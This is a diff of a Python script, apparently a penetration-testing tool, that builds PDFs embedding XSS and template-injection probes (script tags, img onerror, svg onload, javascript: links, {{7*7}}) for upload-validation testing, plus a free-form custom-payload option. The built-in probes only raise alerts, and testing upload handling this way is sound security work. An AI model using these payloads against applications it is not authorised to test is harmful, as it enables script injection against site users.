@@ -1,55 +1,194 @@
 #!/usr/bin/env python3
 
 import argparse
+from datetime import datetime
 from fpdf import FPDF
 
-# Set up command-line argument parsing
-parser = argparse.ArgumentParser(description="Generate a PDF with XSS payload")
-parser.add_argument('-f', '--file', type=str, default='file.pdf', help="Output PDF file path (default: file.pdf)")
-parser.add_argument('-u', '--url', type=str, required=True, help="URL to inject in the <script> tag")
 
-args = parser.parse_args()
+def ask(prompt, default=""):
+    value = input(f"{prompt} [{default}]: ").strip()
+    return value if value else default
 
-# Create a simple PDF with HTML and JavaScript payload embedded
-pdf = FPDF()
 
-# Add a page to the PDF
-pdf.add_page()
+def build_pdf(output_file, client, message, mode, custom_payload=""):
+    pdf = FPDF()
+    pdf.add_page()
 
-# Set the title
-pdf.set_font('Arial', 'B', 16)
-pdf.cell(200, 10, txt="XSS Test PDF with HTML and JavaScript Injection", ln=True, align='C')
+    pdf.set_font("Helvetica", "B", 18)
+    pdf.cell(
+        0,
+        12,
+        text="Web Application Security Test Document",
+        new_x="LMARGIN",
+        new_y="NEXT",
+        align="C",
+    )
 
-# Set some description text
-pdf.set_font('Arial', '', 12)
-pdf.ln(10)  # Line break
-pdf.cell(200, 10, txt="This PDF contains HTML and JavaScript payloads for XSS testing.", ln=True, align='C')
+    pdf.ln(10)
+    pdf.set_font("Helvetica", "", 12)
+    pdf.multi_cell(
+        0,
+        8,
+        text=(
+            f"Client: {client}\n"
+            f"Assessment Type: File Upload Validation\n"
+            f"Test Message: {message}\n"
+            f"Payload Mode: {mode}\n"
+            f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
+            "This document was generated for authorised web application "
+            "file upload and content rendering security testing."
+        ),
+    )
 
-# HTML Payload for testing HTML Injection and Rendering
-html_payload = """
-<h1>This is a test header</h1>
-<p><b>This should be rendered as bold text.</b></p>
-<p>Testing <a href="javascript:alert('XSS Test')">Click me</a> for XSS execution.</p>
-"""
+    payloads = {
+        "1": f"""
+=== EMBEDDED LINK TEST ===
 
-# JavaScript Payload for testing execution (to be interpreted in PDF)
-javascript_payload = f"""
+<a href="javascript:alert('{client} - {message}')">
+Click Me
+</a>
+""",
+        "2": f"""
+=== HTML INJECTION TEST ===
+
+<h1>{client}</h1>
+<p>{message}</p>
+<b>{client} Security Assessment</b>
+""",
+        "3": f"""
+=== IMAGE ONERROR XSS TEST ===
+
+<img src=x onerror="alert('{client} - {message}')">
+""",
+        "4": f"""
+=== SVG ONLOAD XSS TEST ===
+
+<svg onload="alert('{client} - {message}')"></svg>
+""",
+        "5": f"""
+=== SCRIPT TAG XSS TEST ===
+
 <script>
-    alert('plain JS XSS from URL: {args.url}')
+alert('{client} - {message}');
 </script>
-"""
+""",
+        "6": custom_payload,
+        "7": f"""
+=== COMMON PAYLOAD COLLECTION ===
 
-# Add HTML Payload for HTML Rendering Test
-pdf.set_font('Arial', '', 8)
-pdf.add_page()  # Add another page for the HTML content
-pdf.multi_cell(0, 10, html_payload)
+Client: {client}
+Message: {message}
 
-# Add JavaScript Payload (to test if any PDF readers execute JavaScript)
-pdf.add_page()  # Another page for the JavaScript test
-pdf.multi_cell(0, 10, javascript_payload)
+<script>alert('{client}')</script>
 
-# Save the PDF file to a location
-output_file_path = args.file
-pdf.output(output_file_path)
+<img src=x onerror=alert('{client}')>
 
-print(f"PDF created successfully: {output_file_path}")
+<svg/onload=alert('{client}')>
+
+<a href="javascript:alert('{client}')">Click Me</a>
+
+<iframe src="javascript:alert('{client}')"></iframe>
+
+{{{{7*7}}}}
+
+${{7*7}}
+
+{client} - Upload Validation Test
+""",
+    }
+
+    selected_payload = payloads.get(mode, payloads["7"])
+
+    pdf.add_page()
+    pdf.set_font("Courier", "", 8)
+    pdf.multi_cell(0, 5, text=selected_payload)
+
+    pdf.add_page()
+    pdf.set_font("Helvetica", "B", 14)
+    pdf.cell(
+        0,
+        10,
+        text="Assessment Reference",
+        new_x="LMARGIN",
+        new_y="NEXT",
+    )
+
+    pdf.set_font("Helvetica", "", 12)
+    pdf.multi_cell(
+        0,
+        8,
+        text=(
+            f"Client: {client}\n"
+            f"Reference: {client.upper().replace(' ', '-')}-UPLOAD-TEST-001\n\n"
+            "If this content is rendered as HTML or JavaScript within the "
+            "target application, it may indicate insufficient content "
+            "sanitisation or unsafe file processing behaviour."
+        ),
+    )
+
+    pdf.output(output_file)
+
+    print(f"[+] PDF created successfully: {output_file}")
+    print(f"[+] Client: {client}")
+    print(f"[+] Message: {message}")
+
+
+def interactive_mode():
+    print("")
+    print("PDF2XSS Payload Generator")
+    print("========================")
+    print("")
+    print("1) Embedded JavaScript link")
+    print("2) HTML injection payload")
+    print("3) Image onerror XSS payload")
+    print("4) SVG onload XSS payload")
+    print("5) Script tag payload")
+    print("6) Custom payload")
+    print("7) Common payload collection")
+    print("")
+
+    mode = ask("Select payload type", "7")
+    client = ask("Client name", "Example Ltd")
+    message = ask("Alert/message text", "Stored XSS Validation Test")
+    output_file = ask("Output PDF filename", "xss-test.pdf")
+
+    custom_payload = ""
+    if mode == "6":
+        custom_payload = ask("Custom payload", f"<script>alert('{client}')</script>")
+
+    build_pdf(output_file, client, message, mode, custom_payload)
+
+
+def main():
+    parser = argparse.ArgumentParser(
+        description="Generate a PDF containing HTML/XSS test payloads for upload testing."
+    )
+
+    parser.add_argument("-f", "--file", help="Output PDF filename")
+    parser.add_argument("-c", "--client", help="Client name")
+    parser.add_argument("-m", "--message", help="Custom message")
+    parser.add_argument(
+        "-t",
+        "--type",
+        choices=["1", "2", "3", "4", "5", "6", "7"],
+        help="Payload type: 1=link, 2=html, 3=img, 4=svg, 5=script, 6=custom, 7=common",
+    )
+    parser.add_argument("-p", "--payload", default="", help="Custom payload")
+
+    args = parser.parse_args()
+
+    if not any([args.file, args.client, args.message, args.type, args.payload]):
+        interactive_mode()
+        return
+
+    build_pdf(
+        output_file=args.file or "xss-test.pdf",
+        client=args.client or "Example Ltd",
+        message=args.message or "Stored XSS Validation Test",
+        mode=args.type or "7",
+        custom_payload=args.payload,
+    )
+
+
+if __name__ == "__main__":
+    main()
